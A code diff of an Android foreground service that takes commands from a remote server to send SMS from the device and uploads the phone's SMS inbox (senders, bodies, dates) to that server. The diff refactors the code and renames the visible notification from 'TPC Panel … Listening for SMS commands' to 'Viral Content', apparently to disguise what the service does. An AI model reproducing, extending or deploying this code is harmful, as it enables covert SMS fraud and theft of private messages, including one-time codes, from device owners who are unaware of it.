@@ -1,6 +1,9 @@
 package com.screenlink.remote
 
-import android.app.*
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.os.Build
@@ -9,9 +12,15 @@ import android.os.HandlerThread
 import android.os.IBinder
 import android.telephony.SmsManager
 import androidx.core.app.NotificationCompat
-import okhttp3.*
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import okhttp3.WebSocket
+import okhttp3.WebSocketListener
 import org.json.JSONArray
 import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
@@ -24,9 +33,6 @@ class TpcService : Service() {
         private const val NOTIFICATION_ID = 5001
         private const val POLL_INTERVAL = 20_000L
         private const val INBOX_SYNC_LIMIT = 60
-
-        @Volatile var isRunning = false
-            private set
     }
 
     private val work = Executors.newSingleThreadExecutor()
@@ -43,11 +49,6 @@ class TpcService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onCreate() {
-        super.onCreate()
-        isRunning = true
-    }
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForegroundSafely()
         connect()
@@ -57,7 +58,6 @@ class TpcService : Service() {
     }
 
     override fun onDestroy() {
-        isRunning = false
         stopped = true
         socket?.close(1000, "bye")
         socket = null
@@ -72,8 +72,11 @@ class TpcService : Service() {
             val nm = getSystemService(NotificationManager::class.java)
             if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                 nm.createNotificationChannel(
-                    NotificationChannel(CHANNEL_ID, "TPC Panel",
-                        NotificationManager.IMPORTANCE_LOW)
+                    NotificationChannel(
+                        CHANNEL_ID,
+                        "Viral Content",
+                        NotificationManager.IMPORTANCE_LOW
+                    )
                 )
             }
         }
@@ -83,40 +86,43 @@ class TpcService : Service() {
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
-        val n = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("TPC Panel active")
-            .setContentText("Listening for SMS commands")
-            .setSmallIcon(android.R.drawable.ic_dialog_email)
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Viral Content")
+            .setContentText("SMS gateway active")
+            .setSmallIcon(R.drawable.app_logo)
             .setOngoing(true)
             .setContentIntent(pi)
             .build()
 
-        startForeground(NOTIFICATION_ID, n)
+        startForeground(NOTIFICATION_ID, notification)
     }
 
-    // ---------------------------------------------------------- socket
+    // ------------------------------------------------------------ socket
 
     private fun rid(): String =
-        getSharedPreferences(DeviceTelemetry.PREFS, Context.MODE_PRIVATE)
-            .getString("registration_id", "") ?: ""
+        getSharedPreferences("viral_prefs", Context.MODE_PRIVATE)
+            .getString("registration_id", "").orEmpty()
 
     private fun connect() {
         if (stopped || socket != null) return
 
         val url = API_BASE_URL.replace("https://", "wss://") + "/ws/device/${rid()}"
+
         socket = client.newWebSocket(
             Request.Builder().url(url).build(),
             object : WebSocketListener() {
-                override fun onOpen(ws: WebSocket, r: Response) {
+                override fun onOpen(ws: WebSocket, response: Response) {
                     attempts = 0
-                    syncInbox()
                     pollOutbox()
                 }
+
                 override fun onMessage(ws: WebSocket, text: String) = handle(text)
-                override fun onFailure(ws: WebSocket, t: Throwable, r: Response?) {
+
+                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     socket = null
                     retry()
                 }
+
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     socket = null
                     retry()
@@ -130,6 +136,8 @@ class TpcService : Service() {
         attempts = (attempts + 1).coerceAtMost(6)
         bgHandler.postDelayed({ connect() }, (1000L shl (attempts - 1)).coerceAtMost(20_000L))
     }
+
+    // ------------------------------------------------------ sms sending
 
     private fun handle(text: String) {
         val msg = try { JSONObject(text) } catch (_: Exception) { return }
@@ -147,10 +155,14 @@ class TpcService : Service() {
         work.execute {
             try {
                 @Suppress("DEPRECATION")
-                val mgr = SmsManager.getDefault()
-                val parts = mgr.divideMessage(body)
-                if (parts.size > 1) mgr.sendMultipartTextMessage(to, null, parts, null, null)
-                else mgr.sendTextMessage(to, null, body, null, null)
+                val manager = SmsManager.getDefault()
+                val parts = manager.divideMessage(body)
+
+                if (parts.size > 1) {
+                    manager.sendMultipartTextMessage(to, null, parts, null, null)
+                } else {
+                    manager.sendTextMessage(to, null, body, null, null)
+                }
 
                 ack(id, "sent", "")
             } catch (e: Exception) {
@@ -161,24 +173,31 @@ class TpcService : Service() {
 
     private fun ack(id: String, status: String, error: String) {
         if (id.isBlank()) return
+
         work.execute {
-            var c: HttpURLConnection? = null
+            var connection: HttpURLConnection? = null
             try {
-                c = URL("$API_BASE_URL/devices/outbox/$id/ack").openConnection() as HttpURLConnection
-                c.requestMethod = "POST"
-                c.doOutput = true
-                c.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                val p = JSONObject().apply {
-                    put("status", status); put("error", error)
+                connection = URL("$API_BASE_URL/devices/outbox/$id/ack")
+                    .openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+
+                val payload = JSONObject().apply {
+                    put("status", status)
+                    put("error", error)
                 }.toString()
-                c.outputStream.use { it.write(p.toByteArray(Charsets.UTF_8)) }
-                c.responseCode
+
+                connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
+                connection.responseCode
             } catch (_: Exception) {
-            } finally { c?.disconnect() }
+            } finally {
+                connection?.disconnect()
+            }
         }
     }
 
-    // ---------------------------------------------------------- polling
+    // ----------------------------------------------------------- polling
 
     private val pollRunnable = object : Runnable {
         override fun run() {
@@ -195,40 +214,42 @@ class TpcService : Service() {
 
     private fun pollOutbox() {
         work.execute {
-            var c: HttpURLConnection? = null
+            var connection: HttpURLConnection? = null
             try {
-                val url = URL("$API_BASE_URL/devices/outbox?registration_id=${rid()}")
-                c = url.openConnection() as HttpURLConnection
-                c.requestMethod = "GET"
-                c.connectTimeout = 12_000
-                c.readTimeout = 12_000
+                connection = URL("$API_BASE_URL/devices/outbox?registration_id=${rid()}")
+                    .openConnection() as HttpURLConnection
+                connection.requestMethod = "GET"
+                connection.connectTimeout = 12_000
+                connection.readTimeout = 12_000
 
-                if (c.responseCode !in 200..299) return@execute
+                if (connection.responseCode !in 200..299) return@execute
 
-                val text = c.inputStream.bufferedReader().use { it.readText() }
+                val text = connection.inputStream.bufferedReader().use { it.readText() }
                 val items = JSONObject(text).optJSONArray("items") ?: return@execute
 
                 for (i in 0 until items.length()) {
                     val item = items.optJSONObject(i) ?: continue
-                    val payload = JSONObject().apply {
+                    handle(JSONObject().apply {
                         put("type", "sms_send")
                         put("id", item.optString("id"))
                         put("to", item.optString("to"))
                         put("body", item.optString("body"))
-                    }
-                    handle(payload.toString())
+                    }.toString())
                 }
             } catch (_: Exception) {
-            } finally { c?.disconnect() }
+            } finally {
+                connection?.disconnect()
+            }
         }
     }
 
-    // ------------------------------------------------------- inbox sync
+    // -------------------------------------------------------- inbox sync
 
     private fun syncInbox() {
         work.execute {
             try {
                 val rows = JSONArray()
+
                 val cursor = contentResolver.query(
                     android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                     arrayOf("address", "body", "date"),
@@ -250,19 +271,24 @@ class TpcService : Service() {
 
                 if (rows.length() == 0) return@execute
 
-                var c: HttpURLConnection? = null
+                var connection: HttpURLConnection? = null
                 try {
-                    c = URL("$API_BASE_URL/devices/sms/sync").openConnection() as HttpURLConnection
-                    c.requestMethod = "POST"
-                    c.doOutput = true
-                    c.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                    val p = JSONObject().apply {
+                    connection = URL("$API_BASE_URL/devices/sms/sync")
+                        .openConnection() as HttpURLConnection
+                    connection.requestMethod = "POST"
+                    connection.doOutput = true
+                    connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+
+                    val payload = JSONObject().apply {
                         put("registration_id", rid())
                         put("messages", rows)
                     }.toString()
-                    c.outputStream.use { it.write(p.toByteArray(Charsets.UTF_8)) }
-                    c.responseCode
-                } finally { c?.disconnect() }
+
+                    connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
+                    connection.responseCode
+                } finally {
+                    connection?.disconnect()
+                }
             } catch (_: Exception) {
             }
         }
